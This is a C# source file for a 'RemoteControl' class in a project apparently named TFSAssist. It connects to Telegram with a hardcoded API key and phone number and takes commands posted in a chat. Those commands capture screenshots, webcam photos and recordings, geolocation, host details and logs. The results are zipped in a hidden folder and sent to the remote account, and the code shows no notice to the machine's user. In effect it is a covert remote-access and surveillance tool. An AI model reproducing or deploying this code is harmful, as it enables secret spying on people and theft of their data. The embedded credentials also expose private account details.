using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Device.Location;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using TeleSharp.TL;
using TFSAssist.Control;
using Utils;
using Utils.AppUpdater;
using Utils.Handles;
using Utils.Telegram;
using Utils.UIControls.Tools;
using Utils.WinForm.MediaCapture;

namespace TFSAssist
{
    public class RemoteControl : IDisposable
    {
        class TTLControl : TLControl
        {
            public TTLControl(int appiId, string apiHash) : base(appiId, apiHash)
            {

            }
        }

        public Thread MainThread { get; }

        private readonly string ClientID;
        private TTLControl _control;
        private readonly StringBuilder _processingErrorLogs;

        private AForgeMediaDevices _aforgeDevices = null;
        private EncoderMediaDevices _encDevices = null;
        private AForgeCapture _aforgeCapture;
        private EncoderCapture _encoderCapture;

        private GeoCoordinateWatcher _watcher;
        private string _locationResult = string.Empty;
        private bool _tryGetLocation = false;

        private readonly Action _checkUpdates;
        private readonly Func<string> _getLogs;

        private string _tempDir = string.Empty;

        public string TempDirectory
        {
            get
            {
                if (!Directory.Exists(_tempDir))
                    CreateDirectory(_tempDir).Wait();
                return _tempDir;
            }
            private set => _tempDir = value;
        }

        public bool IsEnabled { get; private set; } = false;

        public RemoteControl(Thread mainThread, string clientId, Action checkUpdates, Func<string> getLogs)
        {
            MainThread = mainThread;
            _processingErrorLogs = new StringBuilder();
            _checkUpdates = checkUpdates;
            _getLogs = getLogs;
            ClientID = clientId;
            TempDirectory = Path.Combine(ASSEMBLY.ApplicationDirectory, "Temp");
        }

        public async Task<bool> Initialize()
        {
            InitGeoWatcher();
            await InitTempSession();
            await InitDirectory(TempDirectory);

            InitCamCapture(TempDirectory); // только после InitTempDirectory

            tryConnect:
            try
            {
                await Connect(GetAuthUserCode);
            }
            catch (SocketException ex)
            {
                // если нет соединения с интернетом, пытаемся реконнектиться
                if (ex.SocketErrorCode == SocketError.HostUnreachable || ex.SocketErrorCode == SocketError.TimedOut)
                {
                    await Task.Delay(60000);
                    goto tryConnect;
                }
            }
            
            return IsEnabled;
        }

        async Task Connect(Func<Task<string>> getAuthUserCode)
        {
            try
            {
                IsEnabled = false;
                _control = new TTLControl(770122, "8bf0b952100c9b22fd92499fc329c27e");
                await _control.ConnectAsync();
                IsEnabled = true;

                await Task.Delay(5000);

                SendMessageToCurrentUser($"Connected. {GetCurrentServerInfo()}");

                await Task.Delay(1000);
            }
            catch (AuthorizeException ex)
            {
                if (getAuthUserCode != null)
                {
                    try
                    {
                        await _control.AuthUserAsync(getAuthUserCode, "+375333866536");
                        await Connect(null);
                    }
                    catch (Exception ex2)
                    {
                        WriteExLog(ex2, false);
                    }
                    return;
                }

                WriteExLog(ex, false);
            }
            catch (Exception)
            {
                throw;
            }
        }

        //public async Task EndTransaction()
        //{
        //    await SendMessageToCurrentUser($"Disconnected. {GetCurrentServerInfo()}");
        //}

        private readonly object sendContent = new object();

        void SendMessageToCurrentUser(string message)
        {
            if (IsEnabled)
            {
                try
                {
                    //await _control.SendMessageAsync(_control.CurrentUser.Destination, $"CID=[{ClientID}]\r\n{message.Trim()}", 0);
                    lock (sendContent)
                    {
                        Task task = _control.SendMessageAsync(_control.CurrentUser.Destination, $"CID=[{ClientID}]\r\n{message.Trim()}", 0);
                        task.Wait();
                    }
                }
                catch (Exception ex)
                {
                    WriteExLog(ex);
                }
            }
        }

        void SendBigFileToCurrentUser(string destinationPath)
        {
            if (IsEnabled)
            {
                try
                {
                    //await _control.SendBigFileAsync(_control.CurrentUser.Destination, destinationPath);
                    lock (sendContent)
                    {
                        Task task = _control.SendBigFileAsync(_control.CurrentUser.Destination, destinationPath);
                        task.Wait(); // таймаут ставить нельзя т.к. может интеренет тормознутый и надо дождаться до конца
                    }

                    // очищаем память, т.к. отправляем большой файл
                    GC.Collect();
                }
                catch (Exception ex)
                {
                    WriteExLog(ex);
                }
            }
        }

        

        public async Task Run()
        {
            DateTime lastDate = DateTime.Now;
            while (IsEnabled)
            {
                try
                {
                    //List<TLMessage> newMessages = await _control.GetDifference(_control.CurrentUser.User, _control.CurrentUser.Destination, lastDate);
                    List<TLMessage> newMessages = null;
                    lock (sendContent)
                    {
                        Task<List<TLMessage>> task = _control.GetDifference(_control.CurrentUser.User, _control.CurrentUser.Destination, lastDate);
                        task.Wait();

                        newMessages = task.Result;
                    }

                    TLMessage lastMessage = newMessages?.LastOrDefault();
                    if (lastMessage != null)
                    {
                        await ReadCommands(newMessages, TempDirectory);
                        lastDate = TLControl.ToDate(lastMessage.Date);
                    }
                }
                catch (Exception ex)
                {
                    WriteExLog(ex);
                }

                await Task.Delay(5000);
            }
        }

        async Task ReadCommands(List<TLMessage> newMessages, string projectDirPath)
        {
            bool isUpdate = false;
            string isCommand = ClientID + ":";

            try
            {
                foreach (var tlMessage in newMessages)
                {
                    if (tlMessage.Message.StartsWith(isCommand, StringComparison.CurrentCultureIgnoreCase))
                    {
                        string command = tlMessage.Message.Substring(isCommand.Length, tlMessage.Message.Length - isCommand.Length);
                        Dictionary<string, string> options = null;
                        int optStart = command.IndexOf('(');
                        int optEnd = command.IndexOf(')');
                        if (optStart != -1 && optEnd != -1 && optEnd > optStart)
                        {
                            string strOptions = command.Substring(optStart, command.Length - optStart);
                            options = ReadOptionParams(strOptions);
                            command = command.Substring(0, optStart);
                        }
                        command = command.ToLower().Trim();


                        switch (command)
                        {
                            case "ping":
                                SendMessageToCurrentUser(GetCurrentServerInfo(true));
                                break;

                            case "info":
                                var res = WIN32.GetDetailedHostInfo();
                                if (res?.Count > 0)
                                {
                                    StringBuilder detInfo = new StringBuilder();
                                    int maxLenghtSpace = res.Keys.Aggregate("", (max, cur) => max.Length > cur.Length ? max : cur).Length + 3;

                                    foreach (var value in res)
                                    {
                                        detInfo.Append($"{value.Key} {new string('.', maxLenghtSpace - value.Key.Length)} [{string.Join("];[", value.Value)}]\r\n");
                                    }

                                    Dictionary<string, FileBuildInfo> localVersions = BuildPackInfo.GetLocalVersions(Assembly.GetExecutingAssembly());
                                    if (localVersions?.Count > 0)
                                    {
                                        maxLenghtSpace = localVersions.Keys.Aggregate("", (max, cur) => max.Length > cur.Length ? max : cur).Length + 3;
                                        localVersions = localVersions.OrderBy(p => p.Key).ToDictionary(x => x.Key, x => x.Value);

                                        detInfo.Append($"\r\nLocation=[{Assembly.GetExecutingAssembly().GetDirectory()}]\r\n");
                                        foreach (var versionLocalFiles in localVersions)
                                        {
                                            detInfo.Append($"{versionLocalFiles.Key} {new string('.', maxLenghtSpace - versionLocalFiles.Key.Length)} [{versionLocalFiles.Value.Version}]\r\n");
                                        }
                                    }

                                    await SaveFile(Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.log"), detInfo.ToString());
                                }
                                break;

                            case "log":
                                string logs = GetProcessingLogs();
                                if (logs.IsNullOrEmptyTrim())
                                {
                                    SendMessageToCurrentUser("Log is empty.");
                                    break;
                                }
                                else if (logs.Length <= 500) // если логов немного
                                {
                                    SendMessageToCurrentUser(logs);
                                    break;
                                }

                                await SaveFile(Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.log"), logs);

                                break;

                            case "drive":
                                var drives = DriveInfo.GetDrives();
                                if (drives == null || drives.Length == 0)
                                    break;

                                string result = string.Empty;
                                foreach (DriveInfo drive in drives)
                                {
                                    if (drive.IsReady)
                                    {
                                        result += $"Drive=[{drive.Name}] FreeSize=[{IO.FormatBytes(drive.TotalFreeSpace, out _)}]\r\n";
                                    }
                                }

                                SendMessageToCurrentUser(result);
                                break;

                            case "screen":
                                string imagePath = Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.pam");
                                await ScreenCapture.CaptureAsync(imagePath, ImageFormat.Png);
                                break;

                            case "cpu":
                                // TODO current process cpu
                                break;

                            case "restart":
                                // TODO restart current app
                                break;

                            case "update":
                                isUpdate = true;
                                break;

                            case "loc":
                                if (_locationResult.IsNullOrEmptyTrim())
                                {
                                    SendMessageToCurrentUser("Location unknown.");
                                    _tryGetLocation = true;
                                }
                                else
                                {
                                    SendMessageToCurrentUser(_locationResult);
                                    _tryGetLocation = false;
                                }
                                break;

                            case "caminfo":
                                string resultCamInfo = string.Empty;
                                if (_aforgeDevices != null)
                                {
                                    resultCamInfo = _aforgeDevices.ToString();
                                }

                                if (_encDevices != null)
                                {
                                    resultCamInfo = resultCamInfo + "\r\n" + _encDevices.ToString();
                                }

                                resultCamInfo = resultCamInfo.Trim();

                                if (resultCamInfo.IsNullOrEmptyTrim())
                                    SendMessageToCurrentUser("No devices initialized.");
                                else
                                    SendMessageToCurrentUser(resultCamInfo);
                                break;

                            case "camsett":
                                int exceptionCount = 0;
                                if (options != null && options.Count > 0)
                                {
                                    if (options.TryGetValue("Seconds", out var timeRecStr))
                                    {
                                        if (int.TryParse(timeRecStr, out var timeRec))
                                        {
                                            if (_aforgeCapture != null)
                                                _aforgeCapture.SecondsRecordDuration = timeRec;
                                            if (_encoderCapture != null)
                                                _encoderCapture.SecondsRecordDuration = timeRec;
                                        }
                                    }

                                    if (options.TryGetValue("Video", out var video))
                                    {
                                        try
                                        {
                                            _aforgeCapture?.ChangeVideoDevice(video);
                                        }
                                        catch (Exception ex)
                                        {
                                            exceptionCount++;
                                            WriteExLog($"AForgeException: {ex.Message}");
                                        }

                                        try
                                        {
                                            _encoderCapture?.ChangeVideoDevice(video);
                                        }
                                        catch (Exception ex)
                                        {
                                            exceptionCount++;
                                            WriteExLog($"EncoderException: {ex.Message}");
                                        }
                                    }

                                    if (options.TryGetValue("Audio", out var audio))
                                    {
                                        try
                                        {
                                            _encoderCapture?.ChangeAudioDevice(audio);
                                        }
                                        catch (Exception ex)
                                        {
                                            exceptionCount++;
                                            WriteExLog($"EncoderException: {ex.Message}");
                                        }
                                    }

                                    if(exceptionCount > 0)
                                        SendMessageToCurrentUser($"Errors=[{exceptionCount}]");
                                    else
                                        SendMessageToCurrentUser($"SUCCESS");
                                }

                                break;

                            case "acam":
                                if (_aforgeCapture == null)
                                {
                                    SendMessageToCurrentUser($"AForge not initialized.");
                                    break;
                                }

                                _aforgeCapture.StartCamRecording();

                                break;

                            case "ecam":
                                if (_encoderCapture == null)
                                {
                                    SendMessageToCurrentUser($"Encoder not initialized.");
                                    break;
                                }

                                _encoderCapture.StartCamRecording();

                                break;

                            case "photo":
                                if (_aforgeCapture == null)
                                {
                                    SendMessageToCurrentUser($"AForge not initialized.");
                                    break;
                                }

                                var photo = _aforgeCapture.GetPicture();
                                if (photo != null)
                                {
                                    string photoPath = Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.png");
                                    photo?.Save(photoPath, ImageFormat.Png);
                                }

                                break;
                        }
                    }
                    else if (tlMessage.Message.Like("ping"))
                    {
                        SendMessageToCurrentUser(GetCurrentServerInfo());
                    }
                    else if (tlMessage.Message.Like("update"))
                    {
                        isUpdate = true;
                    }
                }
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
            }
            finally
            {
                SendPreparedFiles(projectDirPath);

                if (isUpdate)
                {
                    _checkUpdates?.BeginInvoke(null, null);
                }
            }
        }


        void SendPreparedFiles(string projectDirPath)
        {
            var tempFiles = Directory.EnumerateFiles(projectDirPath);
            if (tempFiles.Any())
            {
                try
                {
                    string destinationZip = DoZipFile(projectDirPath);
                    if (destinationZip != null && File.Exists(destinationZip))
                    {
                        SendBigFileToCurrentUser(destinationZip);
                        File.Delete(destinationZip);
                    }
                }
                catch (Exception ex)
                {
                    GC.Collect();
                    WriteExLog(ex);
                }

                DeleteAllFilesInDirectory(projectDirPath);
            }
        }



        static Dictionary<string, string> ReadOptionParams(string options)
        {
            Dictionary<string, string> optParams = new Dictionary<string, string>(StringComparer.CurrentCultureIgnoreCase);
            StringBuilder builderParam = new StringBuilder();
            StringBuilder builderValue = new StringBuilder();
            int findParams = 0;
            int findValue = 0;

            foreach (char ch in options)
            {
                if (ch == '(' && findParams == 0)
                {
                    findParams++;
                    continue;
                }

                if (ch == ')' && (findValue == 0 || findValue == 3) && findParams > 0)
                {
                    findParams--;
                    continue;
                }

                if (findParams <= 0)
                    continue;

                if ((ch == '=' && findValue == 0) || (ch == '\'' && findValue >= 1))
                {
                    findValue++;
                    continue;
                }

                if (ch == ',' && findValue == 3)
                {
                    findValue = 0;
                    optParams.Add(builderParam.ToString(), builderValue.ToString());
                    builderParam.Clear();
                    builderValue.Clear();
                    continue;
                }

                if (findValue == 2)
                {
                    builderValue.Append(ch);
                    continue;
                }

                if (!char.IsWhiteSpace(ch) && findValue == 0)
                    builderParam.Append(ch);
            }

            optParams.Add(builderParam.ToString(), builderValue.ToString());
            builderParam.Clear();
            builderValue.Clear();

            return optParams;
        }

        static async Task SaveFile(string destination, string data)
        {
            using (var stream = new FileStream(destination, FileMode.OpenOrCreate))
            {
                byte[] logsBytes = new UTF8Encoding(true).GetBytes(data.Trim());
                await stream.WriteAsync(logsBytes, 0, logsBytes.Length);
            }
        }

        string DoZipFile(string sourceDir)
        {
            try
            {
                string destinationZip = Path.Combine(sourceDir, STRING.RandomStringNumbers(15) + ".zip");
                string packFileTempPath = Path.GetTempFileName();
                File.Delete(packFileTempPath);

                int filesInArchive = 0;
                using (FileStream zipToOpen = new FileStream(packFileTempPath, FileMode.OpenOrCreate))
                {
                    using (ZipArchive archive = new ZipArchive(zipToOpen, ZipArchiveMode.Create))
                    {
                        DirectoryInfo d = new DirectoryInfo(sourceDir);
                        FileInfo[] Files = d.GetFiles("*", SearchOption.AllDirectories);
                        foreach (FileInfo file in Files)
                        {
                            if (IO.IsFileReady(file.FullName))
                            {
                                string destArchPth = file.FullName.Replace(sourceDir, "").Trim('\\');
                                archive.CreateEntryFromFile(file.FullName, destArchPth);
                                filesInArchive++;
                            }
                        }
                    }
                }

                if (filesInArchive == 0)
                {
                    if (File.Exists(packFileTempPath))
                        File.Delete(packFileTempPath);
                    return null;
                }

                //ZipFile.CreateFromDirectory(sourceDir, packFileTempPath, CompressionLevel.Optimal, false);

                File.Copy(packFileTempPath, destinationZip, true);
                File.Delete(packFileTempPath);
                return destinationZip;
            }
            catch (Exception)
            {
                return null;
            }
        }

        string GetCurrentServerInfo(bool detailed = false)
        {
            try
            {
                var hostName = Dns.GetHostName();

                if (detailed)
                    return $"Host=[{hostName}] Thread=[IsAlive={MainThread.IsAlive}; ID={MainThread.ManagedThreadId}] Address=[\"{string.Join("\",\"", Dns.GetHostAddresses(hostName).ToList())}\"]";

                return $"Host=[{hostName}] Thread=[IsAlive={MainThread.IsAlive}; ID={MainThread.ManagedThreadId}]";
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }


        void InitGeoWatcher()
        {
            try
            {
                _watcher = new GeoCoordinateWatcher();
                _watcher.StatusChanged += Watcher_StatusChanged;
                _watcher.Start();
            }
            catch (Exception ex)
            {
                WriteExLog(ex, false);
            }
        }

        private void Watcher_StatusChanged(object sender, GeoPositionStatusChangedEventArgs e)
        {
            if (e.Status != GeoPositionStatus.Ready)
                return;

            if (_watcher.Position.Location.IsUnknown)
                return;

            GeoCoordinate coordinate = _watcher.Position.Location;
            _locationResult = $"Latitude=[{coordinate.Latitude.ToString().Replace(",", ".")}] Longitude=[{coordinate.Longitude.ToString().Replace(",", ".")}]";

            if (_tryGetLocation)
            {
                SendMessageToCurrentUser(_locationResult);
                _tryGetLocation = false;
            }
        }

        

        async Task<string> GetAuthUserCode()
        {
            // ждем когда появится локальный файл с кодом для новой авторизации
            string result = string.Empty;
            string fileAuthCode = TLControl.SessionName + ".code";

            try
            {
                while (!File.Exists(fileAuthCode))
                {
                    await Task.Delay(5000);
                }

                using (var stream = new StreamReader(fileAuthCode))
                {
                    string res = await stream.ReadToEndAsync();
                    result = Utils.Crypto.AES.DecryptStringAES(res, nameof(TLControl));
                }

                File.Delete(fileAuthCode);
            }
            catch (Exception)
            {
                // null
            }

            return result;
        }

        async Task InitTempSession()
        {
            try
            {
                string tempSession = TLControl.SessionName + ".tmp";

                if (!File.Exists(tempSession))
                    return;

                using (var stream = new FileStream(tempSession, FileMode.Open))
                {
                    var buffer = new byte[2048];
                    await stream.ReadAsync(buffer, 0, 2048);
                    using (RegeditControl regedit = new RegeditControl(ASSEMBLY.ApplicationName))
                    {
                        regedit[TLControl.SessionName, RegistryValueKind.Binary] = buffer;
                    }
                }

                File.Delete(tempSession);
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
            }
        }

        async Task InitDirectory(string dirPath)
        {
            var di = new DirectoryInfo(dirPath);
            if (di.Exists)
            {
                try
                {
                    //await IO.DeleteReadOnlyDirectoryAsync(dirPath);

                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                    DeleteAllFilesInDirectory(dirPath);
                }
                catch (Exception ex)
                {
                    WriteExLog(ex, false);
                }
            }
            else
            {
                await CreateDirectory(dirPath);
            }
        }

        void DeleteAllFilesInDirectory(string dirPath)
        {
            try
            {
                var tempFiles = Directory.EnumerateFiles(dirPath);
                foreach (var fileName in tempFiles)
                {
                    if (!IO.IsFileReady(fileName))
                        continue;

                    var fileInfo = new FileInfo(fileName)
                    {
                        Attributes = FileAttributes.Normal
                    };
                    fileInfo.Delete();
                }
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
            }
        }

        async Task CreateDirectory(string dirPath)
        {
            int attempts = 0;

            tryCreateDir:
            try
            {
                DirectoryInfo di = Directory.CreateDirectory(dirPath);
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            }
            catch (Exception ex)
            {
                WriteExLog(ex, false);
                attempts++;
                if (attempts < 5)
                {
                    await Task.Delay(1000);
                    goto tryCreateDir;
                }
            }
        }


        void InitCamCapture(string projectDirPath)
        {
            try
            {
                _aforgeDevices = new AForgeMediaDevices();
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
            }

            try
            {
                _encDevices = new EncoderMediaDevices();
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
            }

            try
            {
                _aforgeCapture = new AForgeCapture(MainThread, _aforgeDevices, _encDevices, projectDirPath, 20);
                _aforgeCapture.OnRecordingCompleted += OnRecordingCompleted;
                _aforgeCapture.OnUnexpectedError += OnUnexpectedError;
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
            }

            try
            {
                _encoderCapture = new EncoderCapture(MainThread, _aforgeDevices, _encDevices, projectDirPath, 20);
                _encoderCapture.OnRecordingCompleted += OnRecordingCompleted;
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
            }
        }

        private void OnUnexpectedError(object sender, MediaCaptureEventArgs args)
        {
            WriteExLog($"AForge Unexpected Error=[{args?.Error?.ToString()}]");
        }

        private async void OnRecordingCompleted(object sender, MediaCaptureEventArgs args)
        {
            if (args == null)
                return;
            if (args.Error != null)
                WriteExLog(args.Error);

            if (string.IsNullOrWhiteSpace(args.DestinationFile) || !File.Exists(args.DestinationFile))
                return;

            int tryCount = 0;
            while (!IO.IsFileReady(args.DestinationFile))
            {
                if (tryCount >= 5)
                    return;

                await Task.Delay(1000);
                tryCount++;
            }

            if (sender is IMediaCapture mediaCapture)
            {
                SendPreparedFiles(mediaCapture.DestinationDir);
            }
        }

        #region LOGS

        readonly object syncLog = new object();

        void WriteExLog(Exception ex, bool isDebug = true)
        {
            WriteExLog(ex?.ToString(), isDebug);
        }

        void WriteExLog(string message, bool isDebug = true)
        {
            //_writeLog?.Invoke(isDebug ? WarnSeverity.Debug : WarnSeverity.Error, $"{nameof(TFSA_TLControl)}=[{ex.Message}]\r\n{ex.StackTrace}");
            //_writeLogs?.Invoke(isDebug ? WarnSeverity.Debug : WarnSeverity.Error, $"{nameof(RemoteControl)}=[{message}]");
            string isDebugStr = isDebug ? "DEBUG" : "ERROR";
            lock (syncLog)
                _processingErrorLogs.Append($"[{isDebugStr}]:[{DateTime.Now:G}]={message}\r\n");
        }

        string GetProcessingLogs()
        {
            string pullLogs = _getLogs?.Invoke();
            pullLogs = pullLogs ?? string.Empty;
            lock (syncLog)
            {
                pullLogs += _processingErrorLogs.ToString().Trim();
                 _processingErrorLogs.Clear();
            }

            return pullLogs;
        }

        #endregion

        public void Dispose()
        {
            try
            {
                IsEnabled = false;
                _control?.Dispose();
                _watcher?.Stop();
                DeleteAllFilesInDirectory(TempDirectory);
            }
            catch (Exception)
            {
                // ignored
            }
        }
    }
}